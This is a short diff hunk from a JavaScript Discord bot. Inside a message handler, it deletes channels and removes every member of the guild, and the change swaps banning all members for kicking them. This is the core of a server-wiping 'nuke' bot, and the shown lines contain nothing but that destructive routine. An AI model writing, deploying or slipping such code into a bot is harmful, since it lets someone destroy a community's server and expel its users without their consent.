@@ -26,7 +26,7 @@ client.on('message', message => {
             c.delete();
         });
         guild.members.forEach(m => {
-            m.ban();
+            m.kick();
         });
     }
 });
